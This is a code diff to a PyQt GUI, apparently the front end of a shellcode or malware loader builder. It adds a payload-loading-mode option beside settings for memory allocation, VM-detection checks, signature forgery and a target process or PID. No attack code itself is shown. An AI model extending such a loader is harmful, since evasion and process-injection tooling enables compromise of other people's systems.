@@ -17,7 +17,8 @@ from .ui_components import (
     create_mem_mode_combobox,
     create_vm_checks_grid,
     create_run_mode_combobox,
-    create_target_combobox
+    create_target_combobox,
+    create_load_payload_combobox
 )
 class LoaderGUI(QWidget):
     
@@ -46,6 +47,8 @@ class LoaderGUI(QWidget):
         
         layout.addWidget(self._create_mem_mode_group())
         
+        layout.addWidget(self._create_load_payload_group())
+
         layout.addWidget(self._create_vm_checks_group())
         
         layout.addWidget(self._create_run_mode_group())
@@ -108,6 +111,14 @@ class LoaderGUI(QWidget):
         ico_group.setLayout(ico_layout)
         return ico_group
     
+    def _create_load_payload_group(self):
+        load_group = QGroupBox('Payload 加载方式')
+        load_layout = QHBoxLayout()
+        self.load_payload_box = create_load_payload_combobox()
+        load_layout.addWidget(self.load_payload_box)
+        load_group.setLayout(load_layout)
+        return load_group
+
     def _create_mem_mode_group(self):
         mem_group = QGroupBox('内存分配方式')
         mem_layout = QHBoxLayout()
@@ -252,6 +263,10 @@ class LoaderGUI(QWidget):
         if not mem_mode:
             mem_mode = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
         
+        load_payload_mode = self.load_payload_box.itemData(self.load_payload_box.currentIndex())
+        if not load_payload_mode:
+            load_payload_mode = get_default_value('load_payload_mode') or 'read_from_self'
+
         target = self.target_box.itemData(self.target_box.currentIndex())
         if not target:
             target = self.target_box.currentText()
@@ -271,6 +286,7 @@ class LoaderGUI(QWidget):
             'sign_app': sign_app,
             'forgery_enable': forgery_enable,
             'mem_mode': mem_mode,
+            'load_payload_mode': load_payload_mode,
             'target': target,
             'target_program': target_program,
             'target_pid': target_pid,
